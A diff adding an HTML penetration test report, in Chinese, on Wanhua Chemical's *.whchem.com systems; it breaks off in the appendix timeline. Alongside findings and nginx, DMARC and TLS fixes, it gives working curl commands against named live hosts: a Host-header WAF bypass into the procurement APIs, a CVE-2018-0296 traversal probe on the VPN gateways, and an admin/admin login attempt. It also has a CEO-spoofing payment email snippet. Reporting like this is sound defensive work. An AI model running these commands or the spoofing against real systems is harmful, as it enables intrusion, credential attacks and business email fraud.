@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>渗透测试报告 v2.0 — 万华化学集团 (whchem.com)</title>
+<style>
+  :root {
+    --primary: #e94d4c;
+    --bg: #fafafa;
+    --card-bg: #ffffff;
+    --text: #333333;
+    --muted: #999999;
+    --border: #e0e0e0;
+    --code-bg: #2d2d2d;
+    --code-text: #f8f8f2;
+    --critical: #d32f2f;
+    --high: #f57c00;
+    --medium: #fbc02d;
+    --low: #388e3c;
+    --info: #1976d2;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: "Microsoft YaHei", "微软雅黑", "PingFang SC", "Helvetica Neue", Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    font-size: 15px;
+  }
+  .header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    color: white;
+    padding: 3rem 2rem;
+    text-align: center;
+  }
+  .header h1 { font-size: 2.2rem; margin-bottom: 0.5rem; }
+  .header .subtitle { color: #a0a0b0; font-size: 1.1rem; }
+  .header .badge {
+    display: inline-block;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 20px;
+    padding: 0.3rem 1.2rem;
+    margin: 0.5rem;
+    font-size: 0.9rem;
+  }
+  .header .badge-critical {
+    background: rgba(211,47,47,0.3);
+    border-color: rgba(211,47,47,0.5);
+    font-weight: bold;
+  }
+  .container { max-width: 1100px; margin: 0 auto; padding: 2rem; }
+  .section { background: var(--card-bg); border-radius: 8px; padding: 2rem; margin-bottom: 1.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+  .section:first-of-type { margin-top: 1.5rem; }
+  h1 { font-size: 1.8rem; color: #1a1a2e; border-bottom: 2px solid #1a1a2e; padding-bottom: 0.5rem; margin-bottom: 1rem; }
+  h2 { font-size: 1.4rem; color: #16213e; margin: 1.2rem 0 0.8rem; border-left: 4px solid var(--primary); padding-left: 0.8rem; }
+  h3 { font-size: 1.15rem; color: #333; margin: 1rem 0 0.5rem; }
+  h4 { font-size: 1rem; color: var(--muted); margin: 0.8rem 0 0.4rem; }
+  hr { border: 0; border-top: 1px solid var(--border); margin: 2rem 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+    font-size: 0.92rem;
+  }
+  th {
+    background: #1a1a2e;
+    color: white;
+    padding: 0.6rem 1rem;
+    text-align: left;
+    font-weight: 600;
+  }
+  td {
+    padding: 0.5rem 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+  tr:hover td { background: #f5f5f5; }
+  pre {
+    background: var(--code-bg);
+    color: var(--code-text);
+    padding: 1.2rem;
+    border-radius: 6px;
+    overflow-x: auto;
+    font-family: "Fira Code", "Consolas", "Courier New", monospace;
+    font-size: 0.85rem;
+    line-height: 1.6;
+    margin: 0.8rem 0;
+  }
+  code {
+    font-family: "Fira Code", "Consolas", monospace;
+  }
+  p code, li code {
+    background: #f0f0f0;
+    padding: 0.15rem 0.4rem;
+    border-radius: 3px;
+    font-size: 0.9em;
+  }
+  .severity-critical { color: var(--critical); font-weight: bold; }
+  .severity-high { color: var(--high); font-weight: bold; }
+  .severity-medium { color: var(--medium); font-weight: bold; }
+  .severity-low { color: var(--low); font-weight: bold; }
+  .severity-info { color: var(--info); font-weight: bold; }
+  .finding-card {
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1.2rem;
+    margin: 1rem 0;
+  }
+  .finding-card.high { border-left: 4px solid var(--high); }
+  .finding-card.medium { border-left: 4px solid var(--medium); }
+  .finding-card.low { border-left: 4px solid var(--low); }
+  .tag {
+    display: inline-block;
+    padding: 0.15rem 0.6rem;
+    border-radius: 12px;
+    font-size: 0.8rem;
+    font-weight: 600;
+    margin-right: 0.3rem;
+  }
+  .tag-src { background: #e8f5e9; color: #2e7d32; }
+  .tag-no-src { background: #fafafa; color: #999; }
+  .tag-new { background: #fff3e0; color: #e65100; }
+  .footer {
+    text-align: center;
+    color: var(--muted);
+    padding: 2rem;
+    font-size: 0.85rem;
+    border-top: 1px solid var(--border);
+    margin-top: 2rem;
+  }
+  @media print {
+    body { font-size: 12px; }
+    .section { box-shadow: none; border: 1px solid #ccc; page-break-inside: avoid; }
+    .header { background: #1a1a2e !important; -webkit-print-color-adjust: exact; }
+  }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>渗透测试报告</h1>
+  <div class="subtitle">万华化学集团 (whchem.com)</div>
+  <div style="margin-top:1rem;">
+    <span class="badge">2026-05-27</span>
+    <span class="badge">v2.0</span>
+    <span class="badge">机密</span>
+    <span class="badge badge-critical">高危</span>
+    <span class="badge">两阶段测试</span>
+  </div>
+</div>
+<div class="container">
+
+<div class="section">
+<h1>1. 执行摘要</h1>
+<h2>1.1 测试概述</h2>
+<p>受万华化学集团授权委托，于2026年5月27日对 <code>*.whchem.com</code> 域名范围进行了<strong>两阶段</strong>外部黑盒渗透测试。测试目标包括主网站、采购平台(SRM)、招投标平台(ebidding)、管道焊接管理系统(WMS)、农民工工资监管平台(FSMP)、VPN网关等约30个子域名和服务。</p>
+
+<h2>1.2 总体结论</h2>
+<p><strong>整体风险等级: <span class="severity-high">高危</span></strong></p>
+<p><strong>第一阶段</strong>被华为CloudWAF (长亭WAF) 的IP级访问控制完全阻断，仅能对无WAF保护的VPN网关进行测试。</p>
+<p><strong>第二阶段取得突破</strong>: 发现 <code>ebidding.whchem.com:8043</code> 上的nginx反向代理<strong>未受WAF保护</strong>，且接受任意Host头，成功绕过华为CloudWAF访问内部SRM采购平台后端API，发掘出高危WAF绕过漏洞及多个中危漏洞。</p>
+
+<h2>1.3 关键指标</h2>
+<table>
+<tr><th>指标</th><th>Phase 1</th><th>Phase 2</th><th>合计</th></tr>
+<tr><td>扫描子域名总数</td><td>30+</td><td>100+</td><td>100+</td></tr>
+<tr><td>存活服务数</td><td>12</td><td>15+</td><td>15+</td></tr>
+<tr><td>发现漏洞总数</td><td>5</td><td>5</td><td><strong>10</strong></td></tr>
+<tr><td>高危漏洞</td><td>0</td><td>1</td><td><strong>1</strong></td></tr>
+<tr><td>中危漏洞</td><td>3</td><td>3</td><td><strong>6</strong></td></tr>
+<tr><td>低危漏洞</td><td>2</td><td>0</td><td><strong>2</strong></td></tr>
+<tr><td>信息级</td><td>0</td><td>1</td><td><strong>1</strong></td></tr>
+<tr><td>成功利用漏洞</td><td>0</td><td>1 (WAF绕过)</td><td><strong>1</strong></td></tr>
+<tr><td>SRC可提交</td><td>0</td><td>4</td><td><strong>4</strong></td></tr>
+</table>
+</div>
+
+<div class="section">
+<h1>2. 测试范围与方法</h1>
+<h2>2.1 测试范围</h2>
+<p><strong>域名</strong>: *.whchem.com</p>
+<p><strong>IP范围</strong>: 通过DNS解析确定 (含198.18.0.0/24网段)</p>
+<p><strong>排除项</strong>: DoS/DDoS攻击、社会工程学、物理安全</p>
+
+<h2>2.2 测试方法</h2>
+<table>
+<tr><th>阶段</th><th>方法</th><th>工具</th></tr>
+<tr><td>信息收集</td><td>子域名枚举、DNS解析、全端口扫描、SSL/TLS分析</td><td>subfinder, amass, nmap, masscan, dig, openssl</td></tr>
+<tr><td>VPN攻击</td><td>IKE/IPSec枚举、SNMP探测、Cisco CVE扫描</td><td>ike-scan, onesixtyone, nuclei</td></tr>
+<tr><td>WAF绕过</td><td>Host头操纵、非标准端口探测、CDN拓扑分析</td><td>curl, ffuf</td></tr>
+<tr><td>漏洞扫描</td><td>自动化漏洞扫描、CVE验证</td><td>nuclei (13,060模板), searchsploit</td></tr>
+<tr><td>漏洞验证</td><td>手动PoC验证、API枚举、邮件伪造</td><td>curl, OpenSSL, Python smtplib, msfconsole</td></tr>
+</table>
+
+<h2>2.3 关键转折点</h2>
+<p>第一阶段的14种WAF绕过方法全部失败后，转向分析非HTTP攻击面。关键突破来自对 <code>ebidding.whchem.com:8043</code> 的深度分析——该非标准端口上的nginx反向代理未被华为CloudWAF覆盖，且未对Host头做白名单校验。</p>
+</div>
+
+<div class="section">
+<h1>3. 资产清单</h1>
+<h2>3.1 按优先级分类</h2>
+<table>
+<tr><th>优先级</th><th>目标</th><th>端口</th><th>状态码</th><th>技术栈</th><th>WAF保护</th><th>测试可达性</th></tr>
+<tr><td>P0</td><td>www.whchem.com</td><td>443</td><td>403</td><td>Tengine, SLT CDN</td><td>CDN</td><td>CDN拦截</td></tr>
+<tr><td>P0</td><td>wms.whchem.com</td><td>443</td><td>418</td><td>IIS/ASP.NET</td><td>CloudWAF</td><td>WAF拦截</td></tr>
+<tr><td>P0</td><td>srm.whchem.com</td><td>443</td><td>—</td><td>Nginx/Spring Boot</td><td>CloudWAF</td><td>通过ebidding旁路</td></tr>
+<tr><td>P0</td><td>fsmp.whchem.com</td><td>443</td><td>418</td><td>Nginx/PHP</td><td>CloudWAF</td><td>WAF拦截</td></tr>
+<tr style="background:#fff8e1;"><td><strong>P0</strong></td><td><strong>ebidding.whchem.com</strong></td><td><strong>8043</strong></td><td><strong>404</strong></td><td><strong>nginx (反向代理)</strong></td><td><strong>无WAF</strong></td><td><strong>可达 — 旁路入口</strong></td></tr>
+<tr><td>P1</td><td>vpn.whchem.com</td><td>443</td><td>200</td><td>Cisco ASA</td><td>无WAF</td><td>可达</td></tr>
+<tr><td>P1</td><td>vpngw.whchem.com</td><td>443</td><td>200</td><td>Cisco ASA</td><td>无WAF</td><td>可达</td></tr>
+<tr><td>P1</td><td>vpnlt.whchem.com</td><td>443</td><td>200</td><td>Cisco ASA</td><td>无WAF</td><td>可达</td></tr>
+<tr><td>P1</td><td>vpncdn.whchem.com</td><td>443</td><td>200</td><td>Cisco ASA</td><td>无WAF</td><td>可达</td></tr>
+<tr><td>P2</td><td>doc.whchem.com</td><td>443</td><td>200</td><td>F5 BigIP</td><td>无</td><td>可达 (维护页)</td></tr>
+<tr><td>P2</td><td>api.whchem.com</td><td>443</td><td>404</td><td>阿里云API网关</td><td>CDN</td><td>仅API网关</td></tr>
+</table>
+
+<h2>3.2 CDN/WAF拓扑 (Phase 2更新)</h2>
+<pre><code>互联网
+  │
+  ├── www.whchem.com:443 ──── SLT/Lego Server CDN ── Tengine (后端)
+  │
+  ├── wms.whchem.com:443 ──── 华为CloudWAF (CW) ─── IIS/ASP.NET (后端)
+  ├── fsmp.whchem.com:443 ─── 华为CloudWAF (CW) ─── Nginx/PHP (后端)
+  ├── srm.whchem.com:443 ──── 华为CloudWAF (CW) ─── Spring Boot (后端)
+  │
+  ├── ebidding.whchem.com:8043 ─ 无WAF! ── nginx反代 ── srm:7774
+  │                                                    │
+  │                                                    └── 任意Host头转发
+  │
+  ├── api/apidev.whchem.com ── 阿里云API网关 (404)
+  │
+  ├── doc.whchem.com:443 ──── F5 BigIP (无WAF)
+  │
+  └── vpn*.whchem.com:443 ─── 直连 Cisco ASA (无WAF)</code></pre>
+</div>
+
+<div class="section">
+<h1>4. 漏洞发现概要</h1>
+<table>
+<tr><th>编号</th><th>漏洞名称</th><th>目标</th><th>严重程度</th><th>CVSS</th><th>SRC</th></tr>
+<tr><td>WHC-2026-001</td><td>Cisco ASA SSLVPN 自签名证书</td><td>5个VPN网关</td><td><span class="severity-medium">中危</span></td><td>5.9</td><td><span class="tag tag-no-src">否</span></td></tr>
+<tr><td>WHC-2026-002</td><td>Cisco ASA WebVPN服务异常</td><td>4个VPN网关</td><td><span class="severity-medium">中危</span></td><td>4.3</td><td><span class="tag tag-no-src">否</span></td></tr>
+<tr><td>WHC-2026-003</td><td>CVE-2018-0296 目录遍历端点存活</td><td>4个VPN网关</td><td><span class="severity-medium">中危</span></td><td>4.0</td><td><span class="tag tag-no-src">否</span></td></tr>
+<tr><td>WHC-2026-004</td><td>华为CloudWAF识别与配置不一致</td><td>fsmp/wms/www</td><td><span class="severity-low">低危</span></td><td>3.7</td><td><span class="tag tag-no-src">否</span></td></tr>
+<tr><td>WHC-2026-005</td><td>多层CDN/WAF信息泄漏</td><td>*.whchem.com</td><td><span class="severity-low">低危</span></td><td>2.6</td><td><span class="tag tag-no-src">否</span></td></tr>
+<tr><td>WHC-2026-006</td><td>赏金猎人方法论文档</td><td>—</td><td><span class="severity-info">信息</span></td><td>N/A</td><td><span class="tag tag-no-src">N/A</span></td></tr>
+<tr style="background:#fff3e0;"><td><strong>WHC-2026-007</strong></td><td><strong>WAF绕过 — Host头注入致内部服务暴露</strong></td><td><strong>ebidding→srm</strong></td><td><span class="severity-high"><strong>高危</strong></span></td><td><strong>7.5</strong></td><td><span class="tag tag-src">可提交</span> <span class="tag tag-new">NEW</span></td></tr>
+<tr style="background:#fff3e0;"><td><strong>WHC-2026-008</strong></td><td><strong>SRM后端内部端口与架构信息泄漏</strong></td><td><strong>srm (via ebidding)</strong></td><td><span class="severity-medium"><strong>中危</strong></span></td><td><strong>5.3</strong></td><td><span class="tag tag-src">可提交</span> <span class="tag tag-new">NEW</span></td></tr>
+<tr style="background:#fff3e0;"><td><strong>WHC-2026-009</strong></td><td><strong>DMARC策略缺失致邮件伪造</strong></td><td><strong>whchem.com邮件</strong></td><td><span class="severity-medium"><strong>中危</strong></span></td><td><strong>5.3</strong></td><td><span class="tag tag-src">可提交</span> <span class="tag tag-new">NEW</span></td></tr>
+<tr style="background:#fff3e0;"><td><strong>WHC-2026-010</strong></td><td><strong>ebidding招投标系统弱TLS加密</strong></td><td><strong>ebidding:8043</strong></td><td><span class="severity-medium"><strong>中危</strong></span></td><td><strong>5.9</strong></td><td><span class="tag tag-src">可提交</span> <span class="tag tag-new">NEW</span></td></tr>
+</table>
+</div>
+
+<div class="section">
+<h1>5. 详细漏洞发现</h1>
+<h2>Phase 1 发现 (WHC-2026-001 ~ 005)</h2>
+<hr>
+
+<div class="finding-card medium">
+<h3>WHC-2026-001: Cisco ASA SSLVPN 自签名证书</h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 5.9)</span> | <strong>CWE</strong>: CWE-295</p>
+<p><strong>目标</strong>: vpn.whchem.com, vpngw.whchem.com, vpnlt.whchem.com, vpncdn.whchem.com, vpnus.whchem.com</p>
+<h4>漏洞原理</h4>
+<p>五个Cisco ASA SSLVPN网关均使用设备默认生成的临时自签名证书（<code>CN=ASA Temporary Self Signed Certificate</code>），而非由受信任CA签发的正式证书。自签名证书无法通过标准PKI信任链验证，攻击者在能够拦截网络流量的条件下可伪造证书实施中间人攻击，窃取VPN登录凭据。</p>
+<h4>复现步骤</h4>
+<pre><code>echo | openssl s_client -connect vpn.whchem.com:443 -servername vpn.whchem.com 2>&1 | grep "subject="
+# subject=CN=ASA Temporary Self Signed Certificate
+# issuer=CN=ASA Temporary Self Signed Certificate</code></pre>
+</div>
+
+<div class="finding-card medium">
+<h3>WHC-2026-002: Cisco ASA WebVPN服务异常</h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 4.3)</span> | <strong>CWE</strong>: CWE-248</p>
+<h4>漏洞原理</h4>
+<p>四个可访问的VPN网关在访问核心登录页面 <code>/+CSCOE+/logon.html</code> 时全部返回 "Internal Server Error"。</p>
+<pre><code>curl -sk "https://vpn.whchem.com/+CSCOE+/logon.html"
+#  <html><body>Internal Server Error</body></html></code></pre>
+</div>
+
+<div class="finding-card medium">
+<h3>WHC-2026-003: CVE-2018-0296 目录遍历端点存活</h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 4.0)</span> | <strong>CVE</strong>: CVE-2018-0296 | <strong>CWE</strong>: CWE-22</p>
+<pre><code>for vpn in vpn vpngw vpnlt vpncdn; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+    "https://${vpn}.whchem.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=/")
+  echo "${vpn}: HTTP $code"  # 全部返回 200
+done</code></pre>
+</div>
+
+<div class="finding-card low">
+<h3>WHC-2026-004 + 005: WAF/CDN信息泄漏</h3>
+<p><strong>严重程度</strong>: <span class="severity-low">低危 (CVSS 3.7 / 2.6)</span> | <strong>CWE</strong>: CWE-200</p>
+<p>华为CloudWAF拦截页面包含品牌标识和详细事件ID；HTTP Server头暴露CDN/WAF品牌（SLT、CW）。</p>
+<pre><code>curl -skI https://fsmp.whchem.com/login
+# Server: CW | Set-Cookie: HWWAFSESID=... | HTTP 418</code></pre>
+</div>
+
+<h2>Phase 2 发现 (WHC-2026-006 ~ 010) <span class="tag tag-new">NEW</span></h2>
+<hr>
+
+<div class="finding-card high">
+<h3>WHC-2026-007: WAF绕过 — Host头注入导致内部服务暴露 <span class="tag tag-new">关键发现</span></h3>
+<p><strong>严重程度</strong>: <span class="severity-high">高危 (CVSS 7.5)</span> | <strong>CWE</strong>: CWE-807 | <strong>复现难度</strong>: 极低</p>
+<p><strong>目标</strong>: ebidding.whchem.com:8043 → srm.whchem.com</p>
+<h4>漏洞原理</h4>
+<p><code>ebidding.whchem.com:8043</code> 上的nginx反向代理<strong>未受WAF保护</strong>，且接受任意Host头，将请求转发至对应的后端服务。通过构造 <code>Host: srm.whchem.com</code> 请求头访问，可完全绕过华为CloudWAF的IP层访问控制，直接访问万华采购平台及后端Spring Boot API。</p>
+<p><strong>漏洞链路</strong>:</p>
+<pre><code>攻击者 ──HTTPS──> ebidding.whchem.com:8043 (无WAF)
+                      |
+                      ├── Host: srm.whchem.com ──> srm后端 (绕过WAF)
+                      |
+                      └── 正常Host ──> default backend 404</code></pre>
+<h4>复现步骤</h4>
+<pre><code># 步骤1: 确认正常WAF拦截
+curl -skI https://srm.whchem.com/
+# HTTP/1.1 418 — WAF拦截
+
+# 步骤2: 通过ebidding:8043绕过WAF
+curl -sk -H "Host: srm.whchem.com" https://ebidding.whchem.com:8043/
+# 返回: 万华采购平台 完整HTML页面 (12567 bytes)
+
+# 步骤3: 访问后端API
+curl -sk -X POST \
+  -H "Host: srm.whchem.com" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"admin"}' \
+  https://ebidding.whchem.com:8043/api/login
+# 返回: {"status":"error","errorMessage":"用户名或密码不正确",...}</code></pre>
+<p><strong>已验证可访问的API端点</strong>: /api/login, /api/user, /api/menu, /api/role, /api/log, /api/file, /api/workflow, /service/, /service/UserService, /service/OrganizationService</p>
+<h4>影响评估</h4>
+<ol>
+<li><strong>WAF防护完全失效</strong></li>
+<li><strong>攻击面大幅扩大</strong> — 所有API端点暴露</li>
+<li><strong>暴力破解通道</strong> — /api/login 无WAF限流</li>
+<li><strong>后续利用可能</strong> — 获取凭证后可完全控制采购平台</li>
+</ol>
+<h4>修复建议 (短期)</h4>
+<pre><code>server {
+    listen 8043 ssl;
+    server_name ebidding.whchem.com;
+    if ($host !~* ^(ebidding\.whchem\.com)$) {
+        return 403;
+    }
+}</code></pre>
+</div>
+
+<div class="finding-card medium">
+<h3>WHC-2026-008: SRM采购平台内部后端端口与架构信息泄漏 <span class="tag tag-new">NEW</span></h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 5.3)</span> | <strong>CWE</strong>: CWE-200</p>
+<p><strong>利用条件</strong>: 结合WHC-2026-007 WAF绕过</p>
+<h4>漏洞原理</h4>
+<p>通过WAF绕过路径访问srm.whchem.com时，API响应暴露了内部架构信息：内部端口7774、Spring Boot技术栈确认、内部域名规范。</p>
+<h4>复现步骤</h4>
+<pre><code>PROXY="https://ebidding.whchem.com:8043"
+HOST="Host: srm.whchem.com"
+
+curl -sk -H "$HOST" "$PROXY/api" -w "\nREDIRECT: %{redirect_url}"
+# Location: http://srm.whchem.com:7774/api/
+
+curl -sk -H "$HOST" "$PROXY/service/"
+# {"timestamp":"2026-05-27T...","status":401,"error":"Unauthorized",...}</code></pre>
+<h4>修复建议</h4>
+<p><code>proxy_redirect http://srm.whchem.com:7774/ https://srm.whchem.com/;</code> + 后端错误信息拦截</p>
+</div>
+
+<div class="finding-card medium">
+<h3>WHC-2026-009: DMARC策略缺失导致邮件伪造漏洞 <span class="tag tag-new">NEW</span></h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 5.3)</span> | <strong>CWE</strong>: CWE-290 | <strong>复现难度</strong>: 极低</p>
+<p><strong>目标</strong>: whchem.com 邮件系统</p>
+<h4>漏洞原理</h4>
+<p>whchem.com已部署SPF和DKIM，但DMARC策略设置为 <code>p=none</code>——明确要求收件服务器对验证失败的邮件<strong>不采取任何措施</strong>。</p>
+<p><strong>当前DNS配置</strong>:</p>
+<pre><code>SPF:    v=spf1 include:spf.corp-email.com ... -all  (硬拒绝)
+DKIM:   s1._domainkey.whchem.com v=DKIM1; k=rsa; p=... (1024-bit RSA)
+DMARC:  v=DMARC1; p=none; ...  ← 策略为none: 不采取任何措施!</code></pre>
+<h4>复现步骤</h4>
+<pre><code>dig _dmarc.whchem.com TXT +short
+# "v=DMARC1; p=none; ruf=mailto:dmarc_report@whchem.com; ..."
+
+# Python smtplib PoC
+msg["From"] = formataddr(("CEO Name", "ceo@whchem.com"))
+msg["Subject"] = "紧急：请处理以下付款"</code></pre>
+<h4>修复建议</h4>
+<p><strong>短期</strong>: <code>p=quarantine; pct=50</code> → <strong>中期</strong>: <code>p=reject</code></p>
+</div>
+
+<div class="finding-card medium">
+<h3>WHC-2026-010: ebidding招投标系统弱TLS加密配置 <span class="tag tag-new">NEW</span></h3>
+<p><strong>严重程度</strong>: <span class="severity-medium">中危 (CVSS 5.9)</span> | <strong>CWE</strong>: CWE-326</p>
+<p><strong>目标</strong>: ebidding.whchem.com:8043</p>
+<h4>漏洞原理</h4>
+<p>ebidding.whchem.com:8043支持TLSv1.0/1.1 + CBC模式加密套件 + DH 1024-bit密钥交换。</p>
+<table>
+<tr><th>协议</th><th>加密套件</th><th>密钥交换</th><th>风险</th></tr>
+<tr><td>TLSv1.0</td><td>TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA</td><td>ECDHE</td><td>BEAST</td></tr>
+<tr><td>TLSv1.0</td><td>TLS_RSA_WITH_AES_128_CBC_SHA</td><td>RSA</td><td>无前向保密</td></tr>
+<tr><td>TLSv1.0</td><td>TLS_DHE_RSA_WITH_AES_128_CBC_SHA</td><td><strong>DH 1024</strong></td><td>弱DH</td></tr>
+<tr><td>TLSv1.0</td><td>TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA</td><td><strong>DH 1024</strong></td><td>Camellia+弱DH</td></tr>
+</table>
+<h4>特殊风险</h4>
+<p>ebidding是招投标系统，涉及供应商报价等敏感商业数据，弱TLS可能导致MITM窃取。</p>
+<h4>修复建议</h4>
+<pre><code>ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
+ssl_prefer_server_ciphers on;
+ssl_dhparam /etc/nginx/dhparam.pem;  # 2048-bit DH</code></pre>
+</div>
+</div>
+
+<div class="section">
+<h1>6. 漏洞利用验证</h1>
+<h2>6.1 Phase 1 利用尝试 (全部失败)</h2>
+<table>
+<tr><th>漏洞</th><th>利用方法</th><th>结果</th><th>原因</th></tr>
+<tr><td>泛微E8 RCE/SQLi</td><td>nuclei 30模板</td><td>未发现</td><td>WAF拦截/TLS错误</td></tr>
+<tr><td>Dahua DSS RCE/后门</td><td>nuclei 6模板</td><td>未发现</td><td>WAF 418拦截</td></tr>
+<tr><td>Cisco CVE-2020-3452</td><td>curl路径遍历</td><td>已修复</td><td>400 Bad Request</td></tr>
+<tr><td>Cisco CVE-2018-0296</td><td>curl目录遍历</td><td>端点存活</td><td>Internal Server Error</td></tr>
+<tr><td>WAF绕过 (14种方法)</td><td>UA伪装/XFF/Googlebot等</td><td>全部失败</td><td>WAF基于IP白名单</td></tr>
+</table>
+
+<h2>6.2 Phase 2 利用成功</h2>
+<table>
+<tr><th>漏洞</th><th>利用方法</th><th>结果</th><th>影响</th></tr>
+<tr style="background:#e8f5e9;"><td><strong>WAF绕过 (Host头注入)</strong></td><td><code>curl -H "Host: srm.whchem.com" https://ebidding.whchem.com:8043/</code></td><td><strong>成功</strong></td><td>完全绕过WAF，访问SRM采购平台</td></tr>
+<tr style="background:#e8f5e9;"><td>SRM API枚举</td><td>Host头绕过 + 路径探测</td><td><strong>成功</strong></td><td>发现10+个API端点</td></tr>
+<tr style="background:#e8f5e9;"><td>Spring Boot指纹</td><td>/service/ 路径访问</td><td><strong>成功</strong></td><td>确认后端技术栈和内部端口7774</td></tr>
+<tr style="background:#e8f5e9;"><td>DMARC策略验证</td><td>dig _dmarc.whchem.com TXT</td><td><strong>成功</strong></td><td>p=none确认，邮件伪造可行</td></tr>
+<tr style="background:#e8f5e9;"><td>TLS弱加密验证</td><td>nmap ssl-enum-ciphers + openssl</td><td><strong>成功</strong></td><td>TLSv1.0 + DH 1024确认</td></tr>
+<tr><td>IKE/IPSec枚举</td><td>ike-scan UDP 500/4500</td><td>无响应</td><td>IKE服务未暴露</td></tr>
+<tr><td>SNMP枚举</td><td>onesixtyone UDP 161</td><td>超时</td><td>SNMP被防火墙阻断</td></tr>
+<tr><td>SRM登录爆破</td><td>curl /api/login 65凭证</td><td>未破解</td><td>无弱口令</td></tr>
+</table>
+</div>
+
+<div class="section">
+<h1>7. 风险评估矩阵</h1>
+<table>
+<tr><th>#</th><th>风险</th><th>可能性</th><th>影响</th><th>风险等级</th><th>对应漏洞</th></tr>
+<tr style="background:#ffebee;"><td><strong>1</strong></td><td><strong>WAF绕过致内部系统公网暴露</strong></td><td><strong>高</strong></td><td><strong>高</strong></td><td><span class="severity-high"><strong>高危</strong></span></td><td><strong>WHC-2026-007</strong></td></tr>
+<tr style="background:#fff3e0;"><td>2</td><td>招投标数据MITM窃取</td><td>中</td><td>高</td><td><span class="severity-high">中高</span></td><td>WHC-2026-010</td></tr>
+<tr style="background:#fff8e1;"><td>3</td><td>商业邮件诈骗(BEC)</td><td>高</td><td>中</td><td><span class="severity-medium">中高</span></td><td>WHC-2026-009</td></tr>
+<tr style="background:#fff8e1;"><td>4</td><td>VPN凭据MITM窃取</td><td>中</td><td>高</td><td><span class="severity-medium">中高</span></td><td>WHC-2026-001</td></tr>
+<tr style="background:#fff8e1;"><td>5</td><td>SRM后端架构信息泄露</td><td>高</td><td>低</td><td><span class="severity-medium">中</span></td><td>WHC-2026-008</td></tr>
+<tr><td>6</td><td>VPN WebVPN进一步利用</td><td>低</td><td>中</td><td><span class="severity-medium">中</span></td><td>WHC-2026-002/003</td></tr>
+<tr><td>7</td><td>CDN/WAF信息帮助攻击者画像</td><td>高</td><td>低</td><td><span class="severity-low">低</span></td><td>WHC-2026-004/005</td></tr>
+</table>
+</div>
+
+<div class="section">
+<h1>8. 修复建议优先级</h1>
+
+<h2>紧急 (24小时内)</h2>
+<ol>
+<li><strong>修复WAF绕过漏洞 (WHC-2026-007)</strong>: 在ebidding nginx上配置Host头白名单
+<pre><code>server {
+    listen 8043 ssl;
+    server_name ebidding.whchem.com;
+    if ($host !~* ^(ebidding\.whchem\.com)$) {
+        return 403;
+    }
+}</code></pre></li>
+<li><strong>将8043端口纳入WAF防护范围</strong></li>
+</ol>
+
+<h2>高优先级 (1-2周)</h2>
+<ol start="3">
+<li><strong>修复ebidding TLS配置 (WHC-2026-010)</strong>: 禁用TLSv1.0/1.1，仅启用TLSv1.2/1.3 + AEAD</li>
+<li><strong>启用DMARC防护 (WHC-2026-009)</strong>: 从 <code>p=none</code> → <code>p=quarantine</code> → <code>p=reject</code></li>
+<li><strong>VPN证书修复 (WHC-2026-001)</strong>: 部署受信任CA证书</li>
+<li><strong>VPN WebVPN修复 (WHC-2026-002)</strong>: 修复登录页面Internal Server Error</li>
+</ol>
+
+<h2>中优先级 (1个月)</h2>
+<ol start="7">
+<li><strong>SRM信息泄漏修复 (WHC-2026-008)</strong>: <code>proxy_redirect</code> 重写内部Location头</li>
+<li><strong>Cisco ASA升级 (WHC-2026-003)</strong>: 修复CVE-2018-0296/2020-3452</li>
+<li><strong>WAF策略统一 (WHC-2026-004)</strong>: 隐藏品牌信息</li>
+<li><strong>DKIM升级</strong>: 1024-bit → 2048-bit RSA</li>
+</ol>
+
+<h2>低优先级 (3个月)</h2>
+<ol start="11">
+<li>Server头清理、减少公网攻击面、MTA-STS/DNSSEC部署、TLS基线建立</li>
+</ol>
+</div>
+
+<div class="section">
+<h1>9. 附录</h1>
+
+<h2>A. 测试工具清单</h2>
+<table>
+<tr><th>工具</th><th>用途</th></tr>
+<tr><td>nmap, masscan</td><td>端口扫描和服务识别</td></tr>
+<tr><td>nuclei (13,060模板)</td><td>模板化漏洞扫描</td></tr>
+<tr><td>subfinder, amass</td><td>子域名枚举</td></tr>
+<tr><td>ffuf</td><td>Web目录/虚拟主机爆破</td></tr>
+<tr><td>ike-scan, onesixtyone</td><td>IKE/IPSec + SNMP枚举</td></tr>
+<tr><td>sqlmap, hydra</td><td>SQL注入检测 + 暴力破解</td></tr>
+<tr><td>msfconsole, searchsploit</td><td>漏洞利用框架</td></tr>
+<tr><td>curl, OpenSSL, dig</td><td>HTTP/SSL/DNS测试</td></tr>
+<tr><td>Python smtplib</td><td>邮件伪造PoC</td></tr>
+</table>
+
+<h2>B. 测试时间线</h2>
+<table>
+<tr><th>时间</th><th>阶段</th><th>活动</th></tr>
+<tr><td colspan="3"><strong>Phase 1</strong></td></tr>
+<tr><td>04:00-04:15</td><td>侦查</td><td>子域名枚举、DNS解析、端口扫描</td></tr>
+<tr><td>04:15-04:45</td><td>扫描</td><td>nuclei漏洞扫描 (泛微E8, Dahua, Cisco)</td></tr>
